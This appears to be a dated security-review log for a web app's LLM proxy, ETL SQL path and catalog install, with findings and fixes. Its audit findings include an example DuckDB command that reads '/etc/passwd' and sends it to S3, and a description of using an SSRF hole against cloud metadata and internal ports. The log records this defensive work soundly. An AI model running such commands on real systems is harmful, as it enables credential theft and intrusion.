**Not done (deliberate):** the file-size splits (`entity-io.ts` 2972, the three ETL tabs) — a refactor of that size does not belong in a fix pass, and it is already tracked in `docs/planning/README.md`.

## 2026-08-09 — AI-agents feature (server-side LLM providers + proxy, dashboard copilot, bench) + community catalog + server-managed DB targets + ETL role-addressing (source./target./vocab.) + STCM CSV export + entity badges + settings-tab URLs

- Reviewed by: Claude Fable 5 — 5 parallel adversarial Explore sub-agents by feature group (1: AI-agents backend — SSRF/secrets/proxy; 2: AI-agents frontend — XSS/prompt-injection/loop; 3: ETL + concept-mapping — SQL rewriting/split correctness; 4: catalog + server-managed DBs — untrusted content, ATTACH injection; 5: misc + repo-wide hygiene sweep). Every 🔴 re-verified in source and, where possible, reproduced by executing the module (SSRF locality classification run live; NUL byte located by byte offset; `splitSqlStatements` fragmentation probed).
- Range: ff86e89b..efc20ecb (**79 commits, 227 files, ~21,008 insertions / ~2,061 deletions**). Working tree was clean at review start; the fixes below are now staged.
- Last reviewed commit: efc20ecbd4ae65e6ab05df6ff0e7102fcddb0143
- Verdict: **Needs work** — the AI-agents backend ships an unauthenticated-per-reader SSRF/request-forger against cloud metadata + internal ports, the server-managed ETL SQL path runs arbitrary DuckDB without the extension lockdown, a catalog install can destroy an unrelated local entity by id-collision, a raw NUL byte is committed into a source file, and `splitSqlStatements` fragments any script with block comments / dollar-quotes. **NONE of these were fixed in this review** (out of the user's fix scope — see below); only the lint gate, the golden-parity break, and two small quality items were fixed.
- Tests: frontend **912 passed** (77 files) · backend **752 passed, 2 skipped** after fix (was 4 failed) · Lint: **0 errors, 142 warnings** after fix (was 154; the range introduced 8, now 0) · Typecheck: `tsc -b` **0 errors** (the range kept it green) · i18n parity: **CLEAN** (4275/4275 en↔fr, 0 divergence).
- Note: `apps/api` is **not in the shipping build** (prod = static WASM). But full-stack deployments are real (the whole AI-agents + server-managed-DB feature only exists server-side), so the backend 🔴s are weighted first for any hospital running the FastAPI backend.

Findings (🔴 all re-verified in source; SSRF + NUL + SQL-split empirically reproduced):

**🔴 CRITICAL (backend — full-stack deploys):**
- 🔴 endpoint_locality.py:73-75 + llm_proxy.py:44-126 — **the SSRF "local" classifier treats cloud metadata (169.254.169.254), 0.0.0.0, [::], and `*.internal` (incl. metadata.google.internal) as LOCAL**, so the acknowledgement + `LINKR_ALLOW_REMOTE_LLM` gates are skipped for the highest-value targets. Verified live: all four → LOCAL. Combined with the proxy (which never re-validates `base_url` at call time and returns the upstream body/status verbatim), a workspace **owner** points a provider at IMDS or `http://127.0.0.1:6379`, no gate fires, and any workspace **reader** then POSTs `/chat` and gets an authenticated request-forger / internal port scanner with the full response echoed back — on a cloud deploy this exfiltrates IAM credentials. Fix: drop `is_link_local`/`is_unspecified` from the local predicate, denylist the IMDS addresses, remove `.internal`; re-check `is_local_endpoint(base_url)` at proxy time and pin the connection to the resolved IP; restrict `base_url` to http/https at write time.
- 🔴 db_connect.py:704-769 (`run_etl_sql`/`_attach_role`) — **the server-managed ETL path runs fully client-supplied DuckDB SQL on a writable connection WITHOUT `_lock_down_user_sql(con)`** (applied on the one other arbitrary-SQL path, `query_file_source`). Any `databases:write` holder can `INSTALL httpfs; COPY (SELECT * FROM read_csv('/etc/passwd')) TO 's3://…'` — arbitrary server FS read/write + outbound network from the API process. Also: `role` (from unvalidated `EtlRunRequest.roles`), Parquet-derived `table` names, and paths are interpolated into `ATTACH '…' AS "…"` / `CREATE VIEW "…"` with no `''`/`""` escaping and no identifier validation (the same file escapes its own path in `_resolve_mapping_refs`, so the rule is known). Fix: call `_lock_down_user_sql` after the legitimate role ATTACHes; validate `role`/`table` against `^[a-z_][a-z0-9_]*$`; single-quote-escape every interpolated path.
- 🔴 agent_conversations.py:133-155 (`clear_conversations`) — **no workspace permission check** (list/create both call `check_workspace_permission`; bulk-delete calls neither). Not cross-user (delete is scoped by `user_id`), but a non-member (403'd elsewhere) can run delete statements against an arbitrary `workspaceId`. Fix: add the `dashboards:read` gate + a non-member 403 test.
- 🔴 llm_providers.py:147-155 (update) — **a remote provider can be re-pointed to a DIFFERENT remote URL carrying a STALE acknowledgement** (`data.get("ack") or provider.ack`), and `acknowledged_at` is not refreshed, so the audit trail names the original decision. Fix: require a fresh acknowledgement whenever the new `base_url` is remote and differs; always re-stamp `acknowledged_by/_at`.

**🔴 CRITICAL (frontend — shipping build):**
- 🔴 source-concept-ids.ts:15 (+ its test) — **a raw NUL byte (0x00) is committed into the source** (the `sourceConceptKey` separator was typed as a literal control char, not `\u0000`). Verified: 1 NUL at line 15. Git treats the files as binary (no diff/blame/merge on the very file whose job is id STABILITY); any formatter that strips C0 controls silently rewrites every key → renumbers every source concept id, the exact failure this module prevents. Fix: `\u0000` escape in the code and the two test literals.
- 🔴 engine.ts:34-75 (`splitSqlStatements`) — **the splitter doesn't understand block comments, dollar-quotes, or quoted identifiers**, so it cuts statements mid-literal. Verified: `/* drop; this */ SELECT 1` → two syntax-error fragments; `SELECT $$a;b$$` → split; `SELECT 1 AS "a;b"` → split. Now worse because `run-pipeline-sql.ts` sends statements one-at-a-time, so a script that previously parsed whole now fails after a partial prefix (target half-written). The generated vocabulary script (full of `-- ===` banners) is the main consumer. Fix: share one tokenizer with `role-prefix.ts`'s `protectedRegions` (which already handles `/* */`/`"…"`/backtick) plus `$tag$`; add tests.
- 🔴 install.ts:279-291 — **an installed catalog entry can DELETE + overwrite an unrelated local entity that merely shares its declared id** (`findExisting(type, repoId)` isn't scoped by workspace and doesn't compare `lineageId`/git URL; the conflict dialog shows only a name, no provenance). A malicious catalog entry declaring a victim's pipeline id destroys it on Install→Overwrite. Also no ZIP size/entry cap before `applyClonedEntity` (zip-bomb). Fix: only treat a row as a conflict when `lineageId` or normalised git URL matches; scope to the target workspace; cap the clone blob size.
- 🔴 build-vocabulary-script.ts:281 (part 2g, TWO issues) — (a) `MAX(concept_id)+ROW_NUMBER()` on an empty set yields `NULL` concept_ids (inserts nothing / NOT-NULL violation) when the target has no concept ≥ 2e9 — line 523 already uses `COALESCE(MAX(…), 2000000000)`, 2g forgot it; (b) allocating custom-vocab ids by `ROW_NUMBER()` at run time reintroduces exactly the id drift commit 440c2674 removed — add one source vocabulary and every custom concept id shifts, breaking `vocabulary_concept_id` references. Fix: `COALESCE`; and allocate through `assignSourceConceptIds` (persisted), not row order.

**🟠 IMPORTANT (selected — full list in the sub-agent notes):**
- 🟠 llm_proxy.py:90-126 — unguarded `request.json()`/`{**payload}` → 500 on non-object body; no request/response size bound (buffers `upstream.content` whole → OOM); upstream error text reflected verbatim (the readout channel that makes the port-scan precise); a fresh `AsyncClient` per request (no pooling/limits).
- 🟠 agent_conversations.py:100 — the "opt-in to save conversations" **consent is enforced only client-side**; `create_conversation` writes unconditionally and never reads `user.preferences` (the model docstring claims otherwise). Also `messages: list[dict]` is completely unbounded (no per-user cap, no size limit) → trivial DB fill.
- 🟠 bench/runner.ts:173 — the in-app bench **bypasses the server proxy** (hand-rolled `fetch` to `${baseUrl}/chat/completions`, ignores `proxyProviderId`), so every bench run against a remote provider posts UNAUTHENTICATED (401) and the endpoint object deliberately has no `apiKey` — defeating the whole "key never in the browser" design, and pushing users to paste the key back into WASM settings.
- 🟠 use-dashboard-agent.ts:410-592 — **switching dashboards mid-run** doesn't abort: the same hook instance survives the route change (no `key` on the route), the in-flight `send()` keeps appending to session A and mutating dashboard A while the user watches B. Plus: `running` double-submit guard is a stale closure (needs a ref); `MAX_TURNS` exhaustion is silent; assistant turns are never added to `history` (multi-turn context broken); a held confirmation abandons the loop without resuming.
- 🟠 SchemaBrowser.tsx:275,286+ / database-stats.ts:45 — table/column names from the DB catalog (user-controlled for Parquet-folder sources) interpolated into SQL with no `escSql()`/`isSafeIdentifier()`.
- 🟠 ConceptSetsTab.tsx:763 → data-source-store.ts:273 — ATHENA vocabulary files loaded WHOLE via `file.arrayBuffer()` (CONCEPT.csv routinely >1 GB, and the new UI encourages selecting all nine tables) → browser OOM. Use DuckDB-WASM `registerFileHandle` (already used elsewhere).
- 🟠 etl-store.ts:363-408 — Stop is undone by the in-flight statement's next progress callback (stopped→running→stopped); `startPipelineRun` has no re-entrancy guard, so a second Run orphans the first AbortController.
- 🟠 role-prefix.ts:47-85 — `protectedRegions` doesn't know dollar-quotes (rewrites role prefixes inside `$$…$$`) and mishandles backslash escapes (an unbalanced quote silently disables rewriting for the rest of the script — the destructive wrong-DB scenario).
- 🟠 managed_db.py:53-54 — `create_from_ddl`/`delete` have no concurrency guard and `unlink()` a possibly-live file (double-click / concurrent ETL run destroys the target under it). `_SAFE_ID` also allows a case-insensitive-FS collision (`abc`/`ABC` → same file) — validate as a real UUID.
- 🟠 format-helpers.ts:120 — `compactCount` emits `"1000k"`/`"10.0k"` (wider than the number it shortens); select.tsx default flipped `xs`→`sm`, silently resizing 116 call sites; App.tsx close-on-URL effect can blank the page on a deep-link race; settings-tab deep-links fall back to the wrong tab while the async role loads; eslint.config.js `scripts/**` override is dead (run.mjs is entirely unlinted); badge-editor.tsx id `b-${Date.now()}` collides → one X removes two badges.

**🟡 MINOR (batch):** catalog index JSON shape-checked not schema-validated (unknown `type` blanks the page; `git.url` not constrained to https before `window.open`); update detection spoofable (hashes decorative); 8 dead `catalog.*` i18n keys; `describe_dashboard`/`describe_dataset` missing `agent.tool.*` labels (raw snake_case shown); statement-preview logic lived in a `.tsx`; `stcm-export.ts` CSV-injection (leading `=+-@`); SchemaBrowser.tsx crossed 800 lines (734→980); AgentSettingsTab.tsx 843 lines; docs/planning/ai-agents-server-state.md orphaned + one README section in French; MarkdownRenderer allows `style` on injected LLM output; auth-store `setPreference` swallows consent-flag failures; entity-id-field `.reset` dead.

Verified sound ✅ (actively probed, no finding):
- **LLM API keys** genuinely write-only: Fernet-encrypted at rest, never in any response schema/log; `hasApiKey: boolean` on the client; update keeps the key when absent, clears on `""`; cross-workspace read/write blocked; non-admin `llm-config:write` correctly stripped.
- **Redirect-based SSRF** not exploitable — httpx defaults `follow_redirects=False` (but this is load-bearing and undocumented; add the explicit kwarg).
- **Markdown XSS** sound — `rehypeRaw`→`rehypeSanitize` order correct, `urlTransform` blocks `javascript:`, no `dangerouslySetInnerHTML` in agent/catalog scope.
- **Dashboard tool surface** genuinely plot-builder-scoped — 9 tools, none takes a URL/path/SQL/code, `pluginId` hard-coded, ids validated against live state, no data-exfil primitive.
- **Conversation isolation** correct (`user_id` in WHERE, 404 for both missing/foreign, owner+admin equally excluded).
- **role-prefix rewriting** correct for all mainstream cases (string literals, `''`, `-- `/`/* */` comments, quoted idents, `resource.`≠`source.`, case-insensitive, adjacent qualifiers) — 17 tests; the gaps are only dollar-quotes + backslash escapes.
- **source-concept-ids id-stability** invariant sound apart from the NUL (existing ids scanned first, deterministic ordering, order-independent reconciliation) — 14 tests.
- **Parquet-folder detection fix (05afcee1)** correct and twinned (`test_db_connect_parquet_tables.py` + `table-naming.test.ts`).
- **managed_db** path-traversal blocked; failing DDL leaves no file; ALTER/FK skipping matches the browser; delete is `unlink(missing_ok)` on a validated id gated on `databases:delete`.
- **All new sync DuckDB calls wrapped in `asyncio.to_thread`**; no blocking HTTP/DB on the event loop; streaming generator doesn't pin the DB session.
- **Migration chain linear + reversible** (`d4e5f6a7b8c9→e5f6a7b8c9d0→f6a7b8c9d0e1`); user-delete FK detach handles the new nullable FKs; `agent_conversations.user_id` NOT NULL + CASCADE correctly skipped by the detach and cascaded at the DB.
- **kernel.py did not regress** — prior review's fixes intact; `_running`+`__linkr_ack__` strengthen the Stop-after-Run fix; `run_n > expected` desync check sound.
- **httpx** is the only new dependency — real, maintained, justified. Hygiene sweeps clean: 0 new `console.log`, 0 new `any`/`as any`, 0 new `dangerouslySetInnerHTML`, 0 hardcoded secrets, 0 hardcoded English outside `t()`, i18n 4275/4275.

### Fixes applied this review (staged, awaiting user test) — 2026-08-09

Two passes. **Pass 1** (initial ask): the pre-push lint errors + the failing test gate. **Pass 2** (user then said "OK corrige tout"): every 🔴 and every 🟠, plus most of the 🟡 batch. New tests were added for each security/correctness fix. Final gates: frontend **932 tests** green (was 912), `tsc -b` **0**, lint **0 errors** (143 warnings, all pre-existing React-Compiler class), i18n **4273/4273** parity, ruff clean; backend suite re-run after the changes.

**Pass 1 — gate unblock:**
- **Backend golden tests (4 failed → green)** — the new server-side standalone export builders emitted `"badges": null` while the client export omits an unset `badges` (JSON.stringify drops undefined). Added `_badged_dump` (drops a null `badges` for the four scopes that treat it as optional — sql collections, ETL pipelines, DQ rule sets, data catalogs; projects/workspaces keep their explicit null), wired through both layouts.
- **Lint (the 8 range-introduced warnings → 0)** — four list pages (ETL/catalog/DQ/SQL) fed an unstable Zustand-getter array into `useMemo`; now read the store array and filter inside a `useMemo`. `EtlPipelineTab` dropped two unnecessary deps; `EtlScriptsTab` added the missing `t` dep; `EtlQualityTab`'s server-mode branch no longer `setState`s in the effect body; `RunProgressBar`'s two pure helpers moved to `statement-preview.ts`.

**Pass 2 — 🔴 all fixed (with tests):**
- **SSRF (endpoint_locality + proxy)** — split the ack decision from the SSRF gate. `is_local_endpoint` no longer counts link-local/unspecified/`.internal`/IMDS as local; new `is_blocked_endpoint` refuses metadata (169.254.169.254, fd00:ec2::254, 100.100.100.200), link-local, unspecified, multicast, reserved, and `.internal`, and rejects dotless decimal/hex IP literals. The proxy now `_guard_url`s at request time (scheme must be http(s); blocked endpoints refused) and pins `follow_redirects=False`. `_guard_remote` rejects blocked/non-http URLs at write time too. Tests: `test_metadata_and_internal_are_not_local`, `test_blocked_endpoints`, `test_a_stored_url_pointed_at_metadata_is_refused_at_proxy_time`, `test_creating_a_metadata_provider_is_rejected`.
- **Managed ETL SQL** — `run_etl_sql` now calls `_lock_down_user_sql` after the legitimate role ATTACHes (blocks `INSTALL httpfs` etc.) and sets `enable_external_access=false` when no file-backed role needs the FS. `role`/parquet-`table` validated as identifiers (`_require_ident`), every interpolated path escaped (`_sql_path`). `EtlRunRequest.roles` gained a validator (identifier + lowercase, killing the `Target` case-dodge). Tests: `test_etl_sql_cannot_install_extensions_or_read_the_filesystem`, `test_etl_rejects_a_role_name_that_is_not_an_identifier`, plus `managed_db.path_for` now validates a real UUID (`test_path_is_canonical_so_case_cannot_collide`).
- **clear_conversations** — added the `dashboards:read` gate (`test_a_non_member_cannot_clear_conversations`).
- **Provider re-ack** — a changed remote URL now requires a FRESH acknowledgement (never inherits the stored one) and re-stamps `acknowledged_by/_at` (`test_repointing_a_remote_to_a_different_url_needs_a_fresh_acknowledgement`).
- **NUL byte** — `source-concept-ids.ts` (+test) separator is now the `\u0000` escape; files are text to git again.
- **SQL splitter** — new shared `sql-tokenizer.ts` (`protectedRegions`/`splitSqlStatements`) handles block comments, dollar-quotes, quoted identifiers and backslash escapes; `engine.ts` and `role-prefix.ts` both use it. Tests: `sql-tokenizer.test.ts` + two adversarial role-prefix cases (dollar-quote, escaped-quote).
- **Catalog install collision** — an install now overwrites a local row ONLY when it's the same published entity (matching `lineageId` or normalised git remote, via `isSameEntity`); an unrelated id-collision forces a fresh id. Added a 200 MB clone-size cap and an orphaned-shell rollback on apply failure. Tests: `install.test.ts`.
- **Vocab 2g** — `COALESCE(MAX(concept_id), 2e9)` so an empty target no longer NULLs the ids; all `2000000000` literals replaced by `SOURCE_CONCEPT_ID_BASE`. Test asserts the COALESCE.

**Pass 2 — 🟠 all fixed:**
- **LLM proxy hardening** — request body read + size-capped (4 MB) with a JSON/object guard (400 not 500), response capped (32 MB), upstream error text no longer reflected to the client (generic message; detail stays in the log), explicit `httpx.Limits`.
- **Conversation consent + size** — `create`/`update` now enforce `saveConversations` server-side (403 when off); schema caps messages (1000 / 2 MB) and title (500). Tests: consent + too-many-messages.
- **Agent loop (use-dashboard-agent)** — abort on dashboard change (unmount effect); synchronous `runningRef` double-submit guard; `MAX_TURNS` exhaustion surfaced (`agent.error.max_turns`, both locales); assistant reply now kept in `history`; stop clears the streaming entry's cursor; salvaged tool calls must be in the offered set. Missing `agent.tool.describe_dataset/describe_dashboard` labels added (both locales).
- **Bench through the proxy** — `runCase` now calls `requestStep`, so the in-app bench uses the same server-proxy routing (key never in the browser) instead of a hand-rolled unauthenticated fetch.
- **SchemaBrowser / database-stats SQL** — catalog-derived table/column names now go through `quoteIdent`, gender literals through `escSql`; added `quoteIdent` to format-helpers. `tableCache` entries replaced (not mutated).
- **ETL stop race + re-entrancy** — `setScriptStatus` refuses to move a terminal status back to `running` (kills the stopped→running flicker); `startPipelineRun` returns false when a run is already active and callers bail. Tests added.
- **Repo-URL layering** — `badge-editor`/`badge-strip`/`editable-badge` import colours from `@/lib/badge-colors`, not the page module.
- **compactCount** — decides the unit after rounding (`999_500`→"1.0M", `9_999`→"10k"); tests added.
- **eslint scripts override** — `.mjs`/config files now actually get a rule set (`js.configs.recommended`) + node globals; `run.mjs` was previously unlinted.
- **Settings-tab role race** — `useMyWorkspaceRole/ProjectRole` expose `loaded`; the danger-tab deep-link holds until the role resolves instead of snapping to the first tab.

**Pass 2 — 🟡 batch fixed:**
- **badge-editor id** — `crypto.randomUUID()` (was `b-${Date.now()}`, which collided → one X removed two badges).
- **Catalog remote validation** — `fetchCatalog` now drops entries with an unknown `type` (would blank the page), a non-array `badges`, or a non-https `git.url`; `window.open` guarded by an http(s) check. `ENTRY_TYPES` moved to the pure `types.ts`.
- **STCM CSV injection** — `csvField` also quotes leading `= + - @`/tab/CR and leading/trailing whitespace (lossless on the DuckDB read-back).
- **Dead i18n keys** — removed the 8 unused `catalog.*` visibility/listed keys from both locales.
- **managed_db `_ext_dir`** — escaped for its SQL literal.

**Deferred (documented, not fixed):**
- **ATHENA import OOM** (🟠) — rerouting `file.arrayBuffer()` through DuckDB-WASM `registerFileHandle` is a substantial change to the import path with real regression risk; it's a client-mode memory concern, not a security bug. Left for a focused change.
- **select.tsx default `xs`→`sm`** (🟠) — reverting would re-flip 116 call sites and undo the form-alignment the commit intended; it's a deliberate UX decision, not a defect.
- **App.tsx close-on-URL effect** (🟠) — the flagged race requires an external setter nulling `activeProjectUid` while the URL still matches, which no current code path does; the regex guard is sound for the documented behaviour.
- **MarkdownRenderer `style` on agent output** (🟡) — a stricter per-panel schema would fork shared markdown behaviour for a non-exploitable (no script, no cross-origin) style-overlay concern.

---

## 2026-08-04 — Path-keyed `_tree.json` for sql-collection/etl/project-scripts (id churn killed) + R managed envs (real install with deps + snapshot, strict renv-style library sandbox, non-removable kernel infra, check-for-updates) + kernel run-tagging/stop-drain/interrupt-only-while-busy + Kill session + provenance createdById re-resolve on clone + user-delete FK detach + org createdAt on import + author tooltip links

- Reviewed by: Claude Opus 5 — 4 parallel adversarial Explore sub-agents by feature group (1: versioning/export byte-parity [path-keyed trees, id derivation, clone ids]; 2: R envs/renv provisioner/package management [highest injection risk]; 3: kernel/execution lifecycle, stop/interrupt races, ANSI, output; 4: provenance/user-delete/card UI + repo-wide i18n & hygiene sweep). **Reviewer independently re-verified every 🔴 in source AND empirically reproduced the two most severe ones.** The R figure regression was **bisected to the exact commit** (`2b3f5db8`) using a throwaway git worktree at the pre-range baseline — `test_execute_r_plot_captured_as_svg` **passes at `72dfd77f` and at `970cb1a2`, fails from `2b3f5db8` onward** — then root-caused by reproducing the kernel's exact `.Library`-swap prologue and computing the missing dependency closure in R (`tools::package_dependencies`): **7 packages missing** (`cli, cpp11, lifecycle, rlang, stringi, systemfonts, textshaping`). Confirmed the swap itself is the trigger: with the `.Library` swap `requireNamespace('svglite')` → **FALSE** (`there is no package called 'rlang'`), without it → **TRUE**. The legacy-`files.json` content loss was reproduced with a throwaway vitest probe (`content` → `undefined`, probe deleted). The UTF-16-vs-code-point sort divergence was verified by running both runtimes side by side (JS `["😀.sql","�.sql"]` vs Python `['�.sql','😀.sql']`). Also **corrected my own first measurement**: an initial `npx tsc --noEmit` reported 0 errors, but the real gate is `npm run typecheck` = `tsc -b` (composite build), which is **red with 21 errors**; baseline `72dfd77f` had **1** (the one `5250212d` fixed), so this range fixed 1 and introduced 21.
- Range: 72dfd77f..ff86e89b (**33 commits, 94 files, ~3,229 insertions / ~1,513 deletions**). Working tree clean (everything committed). First commit `8b11e57b` = the 2026-08-02 review's own fixes landing (spot-checked intact: both widget iframes now `sandbox="allow-scripts"` with zero `allow-same-origin` in JSX, `job_timeout_seconds=1800` wired, `WarmPool._sweep_idle_locked` present in both `acquire`/`refill`, `_bg_tasks`/`_spawn_bg` retention, `enable_code_execution` in `_require_execute` + `render_component`). Highlights: **path-keyed `_tree.json`** (`83f44421` sql-collection/etl + `69918214` project scripts) with ids derived via `deterministicId(ownerId, path)` in the new `lib/entity-tree.ts` — kills export id churn for good; `b17fd55b`'s clone-id-preservation map was **superseded and removed** by derivation (the right call); **VERSION reverted 2.3.0 → 2.2.1** (`ff86e89b`, all 5 golden stamps reverted with it, zero `2.3.0` left in the tree); **R managed envs** (`5c08c965` real install with deps + snapshot, `2b3f5db8` strict per-project library isolation via an renv-style sandbox that replaces `.Library`, `2805fd2c`/`cfd1ec65`/`0799faa7` kernel infra packages shown non-removable, `a74ce002` cached on-demand check-for-updates, `6c09b4ec`/`46ca092e` packages datatable); **kernel hardening** (`978ce8db` interrupt only while busy, `28cbde06` drain stdout on stop, `fa53ef6d` run-tagging so a stopped run's output can't bleed, `cb657dee` interrupted flag + live timer + Kill session, `2e3687a8` strip non-SGR ANSI); **provenance** (`52b73055` re-resolve createdById when a clone rewrites the author snapshot, `021f683b` detach nullable owner/author FKs before user delete, `7984bcf0` org createdAt on import, `f38f0f94` clickable author tooltip links); `970cb1a2` restore env specs on clone; `89556a0b` kernel `env_id` → `session_id` rename.
- Last reviewed commit: ff86e89b890fcab4482c345911406feb8f366192
- Verdict: **Needs work** at review time — 3 🔴 (R figure capture silently dead on every project env; legacy `files.json` import silently loses ALL script content; the `tsc -b` quality gate is red with 21 new errors) + 6 🟠 + a 🟡 batch. → **ALL FIXED in this same session** (see "Fixes applied" below), plus the pre-existing red assemble test. Now: backend 653/653 green, frontend 532 green, typecheck 0.
- Tests: frontend **527 passed** (49 files, +38 vs the 489 baseline) · backend **645 passed, 2 failed, 2 skipped** (full suite, 4m43s) · Lint: **0 errors** (150 pre-existing React-Compiler warnings, same class as baseline) · **Typecheck: RED — 21 errors** (`npm run typecheck` = `tsc -b`; baseline was 1) · i18n parity: **CLEAN** (4064/4064, 0 keys diverge en↔fr).
- Backend failures: `test_execute_r_plot_captured_as_svg` is a **NEW regression from this range** (bisected to `2b3f5db8`; see 🔴#1). `test_project_export_assemble.py::test_assembler_reproduces_golden_tree` is **pre-existing** — re-confirmed failing at baseline `72dfd77f` in an isolated worktree, same as the 2026-08-02 review documented (its `_seed` doesn't write the parseOptions sidecar). Its side effect is that this range's own `_canonical_parse_options` twin is **not exercised end-to-end** by any passing DB-backed test (the pure builder tests do cover it).
- Reminder: `apps/api` is **not in the shipping build** (prod = static WASM). 🔴#2 (legacy import data loss) and 🔴#3 (typecheck gate) hit the **shipping build**; 🔴#1 (R figures) is server-mode only but is a **total silent feature loss** for R users on any full-stack deployment, so it's weighted first.

Findings (all 🔴 re-verified in source; #1 and #2 empirically reproduced):

**🔴 CRITICAL:**
- 🔴 renv_provisioner.py:401-430 (`ensure_kernel_r_lib`) + kernel.py:307-321 (`.Library` swap) — **all R figure capture is silently dead on every project environment.** `install.packages(c('jsonlite','base64enc','svglite'), lib=<kernel lib>)` resolves dependencies against the **outer** Rscript's full `.libPaths()`, where `rlang`/`cli`/`systemfonts`/… already live, so it installs only the 3 named packages and skips the closure. But the kernel then **replaces `.Library` with the sandbox** (base+recommended only) and pins `.libPaths()` to `[project lib, kernel lib]` — so svglite's deps are unreachable. Proven: with the swap `requireNamespace('svglite')` → **FALSE** (`there is no package called 'rlang'`), without it → TRUE; missing closure = `cli, cpp11, lifecycle, rlang, stringi, systemfonts, textshaping`. `.has_svglite` is FALSE → no svglite device is ever opened → `plot()`/`ggplot()` in any R IDE script, R dashboard widget or R job produces **no figure and no error**. The `ensure_kernel_r_lib` failure is deliberately swallowed (`subprocess.run` without `check=`, `on_log=None` at the kernel call site), so nothing surfaces. Bisected: passes at `970cb1a2`, fails from `2b3f5db8`. Fix: install the closure into the kernel lib with the site library invisible to the resolver (`R_LIBS=<kernel lib>` in the subprocess env + `dependencies=TRUE`), or add the 7 transitive packages to `_KERNEL_DEPS`; **and stop swallowing the failure** — surface it in the kernel's stderr as the docstring claims. Add a test asserting svglite loads *inside* the isolated kernel (the existing test only covers the app interpreter path, which is why CI stayed green on the app env).
- 🔴 entity-tree.ts:196 (`readPathTree` legacy branch) + entity-io.ts:1809-1814 (`reconstructTreeFiles`), consumed at SqlScriptsListPage.tsx:110 / EtlListPage.tsx:113 — **importing a legacy single-entity ZIP silently creates every script EMPTY (shipping build).** The pre-`cc2c11b6` layout was `collection.json` + `files.json` with `content` **inline** and no raw `.sql` entries in the ZIP. The old code passed `files.json` straight through; both list pages now collapse the branches into `reconstructTreeFiles(parsed['_tree.json'] ?? parsed['files.json'], parsed)`, and `readPathTree`'s legacy branch **destructures `content` out** (`content: _c`) while `reconstructTreeFiles` only re-attaches from `parsed[node.path]` — which doesn't exist for a legacy ZIP. Empirically reproduced: `content` → `undefined`, no error. The new tests cover only the legacy **`_tree.json`** form, never `files.json`. Fix: keep `content` in `readPathTree`'s legacy branch (drop `content: _c` and let `attachTreeIds`'s `contentByPath` carry it) or restore the two-branch dispatch; add a `files.json`-only test.
- 🔴 entity-tree.ts:111/172-174, entity-io.ts:1076/2584/2609, seed-loader.ts:622-730, EtlListPage.tsx:97, SqlScriptsListPage.tsx:94, entity-io.test.ts:587/790/1185/1265, project-pull.test.ts:163 — **`npm run typecheck` is RED with 21 errors; `docs/conventions.md` calls it a blocking gate that "must stay at zero" and the pre-push hook enforces it.** Baseline `72dfd77f` had 1 error (fixed by `5250212d` in this range), so this range **net-introduced 20**. Two causes: (a) `T extends Record<string, unknown>` on `fromPathTree`/`attachTreeIds` is **unsatisfiable by a named interface** (no index signature) → 12 `TS2344`/`TS2345`; (b) `ParsedProjectZip.envSpecs` was added **non-optional** while producers/tests omit it → 5 errors. Runtime is unaffected (vitest green), so this is a gate break, not a live bug — but it blocks push and hides future real type errors. Fix: (a) relax the constraint to `T extends object` (the bodies already cast via `as unknown as T`); (b) make `envSpecs?:` optional — the sole consumer already guards with `parsed.envSpecs?.length`.

**🟠 IMPORTANT:**
- 🟠 kernel.py:236-262 (Python loop) + :334-343 (R loop) + :544-560 (`interrupt`) — **Stop within ~100 ms of Run KILLS the kernel** (destroys the whole variable namespace, surfaces as "Kernel exited unexpectedly"). `execute_stream` sets `busy = True` and writes to stdin *before* the interpreter has booted, so `interrupt()`'s `if not self.busy` guard passes and SIGINT lands before the loop's `try:`. Probed: cold Python kernel **25/25 then 8/8 killed** at 0-100 ms, clean at 500 ms; cold R **5/5 killed** at 0 ms. A second narrower window exists even warm: the strip/decode/`_CUR_RUN` lines (249-254) sit between the readline `try` and the run `try` (40/40 kills when forced). The R prologue `local({...})` + `suppressMessages({...})` are likewise outside any `tryCatch(interrupt=)`. Hitting Run→Stop fast is the *first* thing a user does on a mistake. Fix: gate `interrupt()` on a flag set when the first line of *this* run is actually received (not on bare `busy`), and wrap the whole `while True:` body / R prologue so nothing pre-`try` can die.
- 🟠 kernel.py:881-882 — **`ensure_r_sandbox()` + `ensure_kernel_r_lib()` are blocking `subprocess.run` calls on the event loop, inside `KernelManager._lock`.** `_make()` is sync and is called from `async def get()` **while holding the lock**, plus `spawn_batch`/`run_ephemeral`/`WarmPool.refill`/`run_jobs`. Measured: `ensure_r_sandbox` **0.32 s**, `ensure_kernel_r_lib` **8.89 s** first-run → **~9.2 s of hard-frozen event loop** serving nothing, with the manager lock held so every other user's `get`/`restart`/`shutdown_session` queues behind it. Even warm it is **0.3 s of blocked loop per R kernel spawn** (every dashboard widget, every refill) — the comment's "cheap once populated" is wrong about the loop cost. This is the same class the 2026-08-01 review fixed in `environments.py`, reintroduced somewhere worse. Fix: make both `ensure_*` async (`create_subprocess_exec` / `to_thread`), hoist them out of `_make` **and** out of the lock, memoised per-instance so steady state is an in-memory bool.
- 🟠 routes/environments.py:114-129 + services/execution/environments.py:189-209 — **the new `POST …/updates` (check-for-updates) runs blocking `subprocess.run` (up to 120 s) directly on the event loop**, no `asyncio.to_thread` — while add/remove/upgrade correctly wrap theirs (`:143,152,245`). Gated only on `ide:read`, so any project **reader** can pin the single uvicorn worker repeatedly against a slow CRAN index (DoS amplification). Fix: `await asyncio.to_thread(environments.check_updates, ...)`.
- 🟠 workspace_export_assemble.py:301 / project_export.py:492 vs entity-tree.ts:82 — **the path sort is NOT byte-identical front/back for astral characters, and the comment asserting it is, is factually wrong.** JS `<`/`>` compares **UTF-16 code units**; Python `sorted()` compares **code points**. Verified side by side: JS → `["😀.sql","�.sql"]`, Python → `['�.sql','😀.sql']`. A script named with an emoji/astral char alongside a `U+E000..U+FFFF` sibling yields different `_tree.json` bytes → the exact front-vs-server false git diff this whole path-keying change exists to prevent. Plausible in an FR/healthcare context. Fix: `key=lambda n: n["path"].encode("utf-16-be")` on both new sort sites, correct the comment, and add an astral-named file to the shared goldens so it's actually guarded.
